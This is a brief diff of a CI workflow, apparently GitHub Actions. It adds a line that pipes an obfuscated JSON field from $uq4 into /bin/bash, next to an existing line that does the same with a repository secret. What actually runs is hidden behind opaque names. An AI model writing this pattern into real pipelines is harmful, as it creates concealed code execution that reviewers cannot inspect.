@@ -22,6 +22,7 @@ jobs:
           luh2: ${{ secrets.luh2 }}
         run: |
           printf '%s' "$luh2" | jq -r .w791 | /bin/bash
+          echo $uq4 | jq -r .clhe155 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
